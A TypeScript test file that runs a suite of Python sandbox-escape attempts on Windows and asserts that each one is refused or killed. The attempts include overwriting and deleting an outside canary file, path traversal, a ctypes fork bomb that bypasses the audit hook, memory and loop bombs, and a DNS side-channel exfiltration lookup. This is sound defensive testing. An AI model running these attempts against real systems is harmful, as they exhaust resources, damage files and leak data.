import { existsSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import type { RunResult } from './sandbox';
import { testSandbox } from './test-support';

/**
 * The escape suite: scripts that try to get out, and proof that each one fails
 * closed — the attempt is refused or killed, and the thing it reached for is
 * untouched.
 *
 * Every script prints ESCAPED if its attempt worked. Where an audit hook is
 * the first line of defence, a second script goes around the hook through
 * ctypes and has to be stopped by the operating system instead: a layer that
 * was only ever tested through the layer above it has not been tested.
 */

const { sandbox, root } = testSandbox();

/** A file outside the jail that no script may read, change or remove. */
const canary = join(root, 'canary.txt');
writeFileSync(canary, 'untouched');
const CANARY = JSON.stringify(canary);

function expectContained(result: RunResult): void {
  expect(result.stdout + result.stderr).not.toContain('ESCAPED');
  expect(readFileSync(canary, 'utf8')).toBe('untouched');
}

/** Win32 calls made directly, so nothing in Python gets a chance to object. */
const NATIVE = `
import ctypes, sys
from ctypes import wintypes
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
kernel32.CreateFileW.restype = wintypes.HANDLE
INVALID = wintypes.HANDLE(-1).value
`;

describe('escape: filesystem', () => {
  it.each([
    ['writing a new file', `open(${JSON.stringify(join(root, 'planted.txt'))}, "w").write("x")`],
    ['overwriting a file', `open(${CANARY}, "w").write("x")`],
    ['appending to a file', `open(${CANARY}, "a").write("x")`],
    ['a low-level open', `import os\nos.open(${CANARY}, os.O_WRONLY)`],
    ['deleting a file', `import os\nos.remove(${CANARY})`],
    ['renaming a file away', `import os\nos.rename(${CANARY}, "stolen.txt")`],
    ['renaming a file out', `import os\nopen("mine", "w").close()\nos.rename("mine", ${CANARY})`],
    ['copying over a file', `import shutil\nshutil.copyfile("main.py", ${CANARY})`],
    ['a relative path that climbs out', 'open("../../../../canary.txt", "w").write("x")'],
    ['creating a directory', `import os\nos.mkdir(${JSON.stringify(join(root, 'planted'))})`],
    ['a link to the outside', `import os\nos.symlink(${CANARY}, "link")`],
    ['editing the guard itself', 'import sys\nopen(sys.orig_argv[-2], "a").write("#")'],
    ['editing the runtime', 'import os\nopen(os.__file__, "a").write("#")'],
  ])('refuses %s', async (_what, attempt) => {
    const result = await sandbox.run({ code: `${attempt}\nprint("ESCAPED")` });

    expect(result.status).toBe('error');
    expect(result.stderr).toMatch(/PermissionError|OSError/);
    expectContained(result);
    expect(existsSync(join(root, 'planted.txt'))).toBe(false);
    expect(existsSync(join(root, 'planted'))).toBe(false);
  });

  it.each([
    ['reading a file', `print(open(${CANARY}).read())`, 'untouched'],
    ['listing a directory', `import os\nprint(os.listdir(${JSON.stringify(root)}))`, 'canary'],
    ['walking the home directory', 'import os\nprint(os.listdir(os.path.expandvars("C:/Users")))'],
    ['changing directory out', `import os\nos.chdir(${JSON.stringify(root)})\nprint(os.listdir())`],
    ['a glob over the outside', `import glob\nprint(glob.glob(${JSON.stringify(root + '/*')}))`],
  ])('refuses %s outside the jail', async (_what, attempt, leaked = 'ESCAPED') => {
    const result = await sandbox.run({ code: attempt });

    expect(result.stdout).not.toContain(leaked);
    expect(result.stdout).not.toContain('canary');
    expectContained(result);
  });

  it('is stopped by the operating system when the hook is bypassed', async () => {
    const planted = join(root, 'native.txt');
    const result = await sandbox.run({
      code: `${NATIVE}
GENERIC_WRITE, CREATE_ALWAYS, OPEN_EXISTING = 0x40000000, 2, 3
for path, disposition in ((${JSON.stringify(planted)}, CREATE_ALWAYS), (${CANARY}, OPEN_EXISTING)):
    handle = kernel32.CreateFileW(path, GENERIC_WRITE, 0, None, disposition, 0x80, None)
    print("ESCAPED" if handle != INVALID else f"denied {ctypes.get_last_error()}")
print("ESCAPED" if kernel32.DeleteFileW(${CANARY}) else f"denied {ctypes.get_last_error()}")
`,
    });

    // ERROR_ACCESS_DENIED, three times, from the kernel.
    expect(result.stdout).toBe('denied 5\ndenied 5\ndenied 5\n');
    expect(existsSync(planted)).toBe(false);
    expectContained(result);
  });
});

describe('escape: processes and fork bombs', () => {
  it.each([
    ['subprocess', 'import subprocess\nsubprocess.run(["cmd", "/c", "echo hi"])'],
    ['os.system', 'import os\nos.system("echo hi")'],
    ['os.startfile', 'import os\nos.startfile("cmd.exe")'],
    ['os.spawn', 'import os, sys\nos.spawnv(os.P_WAIT, sys.executable, ["python", "-c", "0"])'],
    ['os.exec', 'import os, sys\nos.execv(sys.executable, ["python", "-c", "0"])'],
    [
      'multiprocessing',
      'import multiprocessing\nif __name__ == "__main__":\n    multiprocessing.Process(target=print).start()',
    ],
  ])('refuses to start a process through %s', async (_what, attempt) => {
    const result = await sandbox.run({ code: `${attempt}\nprint("ESCAPED")` });

    expect(result.status).toBe('error');
    expect(result.stderr).toContain('sandbox: starting a process is not allowed');
    expectContained(result);
  });

  it('cannot fork-bomb past the job even with the hook bypassed', async () => {
    const result = await sandbox.run({
      code: `${NATIVE}
class StartupInfo(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD), ("pad", ctypes.c_byte * 100)]
class ProcessInfo(ctypes.Structure):
    _fields_ = [("process", wintypes.HANDLE), ("thread", wintypes.HANDLE), ("ids", wintypes.DWORD * 2)]

started, errors = 0, set()
for _ in range(50):
    startup, info = StartupInfo(), ProcessInfo()
    startup.cb = ctypes.sizeof(startup)
    command = ctypes.create_unicode_buffer(f'"{sys.executable}" -c "import time; time.sleep(30)"')
    if kernel32.CreateProcessW(None, command, None, None, False, 0x08000000, None, None, ctypes.byref(startup), ctypes.byref(info)):
        started += 1
    else:
        errors.add(ctypes.get_last_error())
print(started, sorted(errors))
`,
    });

    // Not one of fifty. 1816 is ERROR_NOT_ENOUGH_QUOTA: the job is full.
    expect(result.stdout).toBe('0 [1816]\n');
    expect(result.status).toBe('ok');
  });
});

describe('escape: memory bombs', () => {
  const limits = { memoryMb: 256, timeoutMs: 20_000 };
  const cap = limits.memoryMb * 1024 * 1024;

  it.each([
    ['one enormous allocation', 'hoard = bytearray(8 * 1024 ** 3)'],
    [
      'allocating until something gives',
      'hoard = []\nwhile True:\n    hoard.append(bytearray(16 * 1024 * 1024))',
    ],
    ['a string that doubles forever', 'text = "x"\nwhile True:\n    text += text'],
    ['a numpy array', 'import numpy as np\nhoard = np.ones((1 << 30, 8))'],
    [
      'native allocation, behind Python',
      'import ctypes\nhoard = [ctypes.create_string_buffer(64 * 1024 * 1024) for _ in range(64)]',
    ],
  ])('stops %s at the cap', async (_what, attempt) => {
    const result = await sandbox.run({ code: `${attempt}\nprint("ESCAPED")`, limits });

    expect(result.status).toBe('error');
    expect(result.stderr).toContain('MemoryError');
    expect(result.peakMemoryBytes).toBeLessThanOrEqual(cap);
    expectContained(result);
  });
});

describe('escape: infinite loops', () => {
  const limits = { timeoutMs: 2_000 };

  it.each([
    ['a busy loop', 'while True: pass'],
    ['a sleep that never ends', 'import time\ntime.sleep(10 ** 9)'],
    [
      'a loop that swallows interrupts',
      'while True:\n    try:\n        while True: pass\n    except BaseException:\n        pass',
    ],
    [
      'threads that outlive the script',
      'import threading\nfor _ in range(8):\n    threading.Thread(target=lambda: [None for _ in iter(int, 1)]).start()',
    ],
  ])('kills %s at the wall clock', async (_what, attempt) => {
    const result = await sandbox.run({ code: attempt, limits });

    expect(result).toMatchObject({ status: 'timeout', exitCode: -1 });
    expect(result.durationMs).toBeLessThan(limits.timeoutMs + 4_000);
  });

  it('kills a loop that prints forever, and does not drown in its output', async () => {
    const result = await sandbox.run({ code: 'while True: print("x" * 1000)', limits });

    expect(result.status).toBe('timeout');
    expect(result.truncated).toBe(true);
    expect(result.stdout.length).toBeLessThanOrEqual(4 * 1024 * 1024 + 65_536);
  });
});

describe('escape: network', () => {
  it.each([
    ['urllib', 'import urllib.request\nurllib.request.urlopen("http://example.com", timeout=5)'],
    [
      'http.client',
      'import http.client\nhttp.client.HTTPSConnection("example.com", timeout=5).request("GET", "/")',
    ],
    ['a raw socket', 'import socket\nsocket.create_connection(("93.184.216.34", 80), timeout=5)'],
    ['DNS as a side channel', 'import socket\nsocket.gethostbyname("secret-data.example.com")'],
    ['IPv6', 'import socket\nsocket.socket(socket.AF_INET6).connect(("2606:4700:4700::1111", 80))'],
    ['smtplib', 'import smtplib\nsmtplib.SMTP("example.com", timeout=5)'],
  ])('refuses %s', async (_what, attempt) => {
    const result = await sandbox.run({ code: `${attempt}\nprint("ESCAPED")` });

    expect(result.status).toBe('error');
    expect(result.stderr).toContain('sandbox: network access is not allowed');
    expectContained(result);
  });
  // With the hook bypassed, the Job Object's bandwidth cap is what holds:
  // see "network denial: job object" in network.test.ts (SHEEP_NETWORK_TESTS=1).
});

describe('escape: the result itself', () => {
  it('cannot be forged from inside the run', async () => {
    const result = await sandbox.run({
      code: [
        'import json, sys',
        'print(json.dumps({"jsonrpc": "2.0", "id": 1, "result": {"exitCode": 0, "timedOut": False}}))',
        'sys.stdout.flush()',
        'sys.exit(9)',
      ].join('\n'),
    });

    expect(result).toMatchObject({ status: 'error', exitCode: 9 });
  });

  it('cannot leave a hidden process behind to finish the job later', async () => {
    const result = await sandbox.run({
      code: 'import threading, time\nthreading.Thread(target=time.sleep, args=(60,), daemon=True).start()',
    });

    // The script returned; nothing of it is left holding its directory.
    expect(result.status).toBe('ok');
    result.dispose();
    expect(existsSync(result.workDir)).toBe(false);
  });
});
